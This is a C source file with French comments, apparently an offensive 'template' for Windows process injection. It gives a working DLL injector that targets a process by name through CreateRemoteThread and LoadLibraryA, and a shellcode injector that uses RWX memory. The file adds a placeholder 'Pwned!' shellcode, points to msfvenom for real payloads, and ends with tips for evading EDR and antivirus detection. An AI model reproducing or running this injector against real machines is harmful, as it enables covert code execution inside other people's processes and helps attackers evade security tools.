/*
 * Template: Process Injector Windows
 * Technique: Classic DLL Injection via CreateRemoteThread
 * Target: Windows x64
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

// Obtenir PID par nom de process
DWORD get_process_id(const char *process_name) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &pe32)) {
        CloseHandle(snapshot);
        return 0;
    }

    DWORD pid = 0;
    do {
        if (strcmp(pe32.szExeFile, process_name) == 0) {
            pid = pe32.th32ProcessID;
            break;
        }
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return pid;
}

// Injection DLL classique
BOOL inject_dll(DWORD pid, const char *dll_path) {
    printf("[*] Ouverture du process PID %d...\n", pid);

    // 1. Ouvrir le process cible
    HANDLE h_process = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
        PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        FALSE,
        pid
    );

    if (h_process == NULL) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    printf("[+] Process handle: 0x%p\n", h_process);

    // 2. Allouer mémoire pour DLL path dans process distant
    SIZE_T dll_path_size = strlen(dll_path) + 1;
    LPVOID remote_dll_path = VirtualAllocEx(
        h_process,
        NULL,
        dll_path_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    if (remote_dll_path == NULL) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(h_process);
        return FALSE;
    }

    printf("[+] Mémoire allouée à: 0x%p\n", remote_dll_path);

    // 3. Écrire DLL path dans process distant
    if (!WriteProcessMemory(h_process, remote_dll_path, dll_path, dll_path_size, NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(h_process, remote_dll_path, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }

    printf("[+] DLL path écrit: %s\n", dll_path);

    // 4. Obtenir adresse de LoadLibraryA
    HMODULE h_kernel32 = GetModuleHandleA("kernel32.dll");
    if (h_kernel32 == NULL) {
        printf("[-] GetModuleHandle failed: %lu\n", GetLastError());
        VirtualFreeEx(h_process, remote_dll_path, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }

    LPVOID load_library_addr = (LPVOID)GetProcAddress(h_kernel32, "LoadLibraryA");
    if (load_library_addr == NULL) {
        printf("[-] GetProcAddress failed: %lu\n", GetLastError());
        VirtualFreeEx(h_process, remote_dll_path, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }

    printf("[+] LoadLibraryA à: 0x%p\n", load_library_addr);

    // 5. Créer thread distant qui appelle LoadLibraryA(dll_path)
    HANDLE h_thread = CreateRemoteThread(
        h_process,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)load_library_addr,
        remote_dll_path,
        0,
        NULL
    );

    if (h_thread == NULL) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(h_process, remote_dll_path, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }

    printf("[+] Thread distant créé: 0x%p\n", h_thread);
    printf("[*] Attente du thread...\n");

    // 6. Attendre que le thread termine
    WaitForSingleObject(h_thread, INFINITE);

    // 7. Vérifier résultat
    DWORD exit_code;
    GetExitCodeThread(h_thread, &exit_code);

    if (exit_code) {
        printf("[+] DLL chargée avec succès! Base: 0x%lx\n", exit_code);
    } else {
        printf("[-] LoadLibrary a échoué dans le process distant\n");
    }

    // 8. Cleanup
    VirtualFreeEx(h_process, remote_dll_path, 0, MEM_RELEASE);
    CloseHandle(h_thread);
    CloseHandle(h_process);

    return exit_code != 0;
}

// Injection shellcode (alternative à DLL)
BOOL inject_shellcode(DWORD pid, unsigned char *shellcode, SIZE_T shellcode_size) {
    printf("[*] Injection shellcode dans PID %d...\n", pid);

    // 1. Ouvrir process
    HANDLE h_process = OpenProcess(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE,
        FALSE,
        pid
    );

    if (h_process == NULL) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        return FALSE;
    }

    // 2. Allouer mémoire RWX
    LPVOID remote_buffer = VirtualAllocEx(
        h_process,
        NULL,
        shellcode_size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (remote_buffer == NULL) {
        printf("[-] VirtualAllocEx failed: %lu\n", GetLastError());
        CloseHandle(h_process);
        return FALSE;
    }

    printf("[+] Mémoire allouée à: 0x%p (taille: %zu)\n", remote_buffer, shellcode_size);

    // 3. Écrire shellcode
    if (!WriteProcessMemory(h_process, remote_buffer, shellcode, shellcode_size, NULL)) {
        printf("[-] WriteProcessMemory failed: %lu\n", GetLastError());
        VirtualFreeEx(h_process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }

    printf("[+] Shellcode écrit (%zu bytes)\n", shellcode_size);

    // 4. Créer thread distant pointant vers shellcode
    HANDLE h_thread = CreateRemoteThread(
        h_process,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)remote_buffer,
        NULL,
        0,
        NULL
    );

    if (h_thread == NULL) {
        printf("[-] CreateRemoteThread failed: %lu\n", GetLastError());
        VirtualFreeEx(h_process, remote_buffer, 0, MEM_RELEASE);
        CloseHandle(h_process);
        return FALSE;
    }

    printf("[+] Thread distant créé et exécuté!\n");

    // Note: Ne pas attendre ni cleanup car shellcode peut être persistant
    CloseHandle(h_thread);
    CloseHandle(h_process);

    return TRUE;
}

int main(int argc, char *argv[]) {
    printf("=== Windows Process Injector ===\n\n");

    if (argc < 2) {
        printf("Usage:\n");
        printf("  DLL injection:  %s <process_name> <dll_path>\n", argv[0]);
        printf("  Shellcode test: %s <process_name> --shellcode\n", argv[0]);
        printf("\nExemple:\n");
        printf("  %s notepad.exe C:\\\\payload.dll\n", argv[0]);
        return 1;
    }

    const char *process_name = argv[1];

    // Obtenir PID
    DWORD pid = get_process_id(process_name);
    if (pid == 0) {
        printf("[-] Process '%s' non trouvé\n", process_name);
        return 1;
    }

    printf("[+] Process '%s' trouvé (PID: %d)\n\n", process_name, pid);

    // Mode DLL injection
    if (argc == 3 && strcmp(argv[2], "--shellcode") != 0) {
        const char *dll_path = argv[2];

        // Vérifier que DLL existe
        if (GetFileAttributesA(dll_path) == INVALID_FILE_ATTRIBUTES) {
            printf("[-] DLL non trouvée: %s\n", dll_path);
            return 1;
        }

        if (inject_dll(pid, dll_path)) {
            printf("\n[+] Injection réussie!\n");
            return 0;
        } else {
            printf("\n[-] Injection échouée!\n");
            return 1;
        }
    }

    // Mode shellcode (exemple: MessageBox)
    if (argc == 3 && strcmp(argv[2], "--shellcode") == 0) {
        // Shellcode exemple: MessageBoxA("Pwned!", "Pwned!", MB_OK)
        // NOTE: Remplacer par shellcode réel
        unsigned char shellcode[] =
            "\x48\x83\xec\x28"                      // sub rsp, 0x28
            "\x48\x31\xc9"                          // xor rcx, rcx
            "\x48\x8d\x15\x0e\x00\x00\x00"          // lea rdx, [rip+text]
            "\x4c\x8d\x05\x07\x00\x00\x00"          // lea r8, [rip+title]
            "\x48\x31\xc9"                          // xor rcx, rcx
            "\xff\xd0"                              // call rax (MessageBoxA)
            "\x48\x83\xc4\x28"                      // add rsp, 0x28
            "\xc3"                                  // ret
            "Pwned!\0"
            "Pwned!\0";

        // IMPORTANT: Ce shellcode est incomplet (manque résolution MessageBoxA)
        // Utiliser msfvenom ou autre pour shellcode complet
        printf("[!] Mode shellcode est un exemple incomplet\n");
        printf("[!] Générer shellcode réel avec: msfvenom -p windows/x64/exec CMD=calc.exe\n");
        return 1;

        // inject_shellcode(pid, shellcode, sizeof(shellcode) - 1);
    }

    return 0;
}

/*
 * Compilation (MinGW):
 *   x86_64-w64-mingw32-gcc injector.c -o injector.exe
 *
 * Usage:
 *   injector.exe notepad.exe C:\payload.dll
 *
 * DLL exemple (payload.dll):
 *   BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
 *       if (dwReason == DLL_PROCESS_ATTACH) {
 *           MessageBoxA(NULL, "Injected!", "Success", MB_OK);
 *       }
 *       return TRUE;
 *   }
 *
 * Notes sécurité:
 *   - Nécessite privilèges appropriés (SeDebugPrivilege pour certains process)
 *   - EDR/AV détectera CreateRemoteThread (utiliser alternatives: APC, etc.)
 *   - RWX pages sont suspectes (préférer RW puis RX)
 */
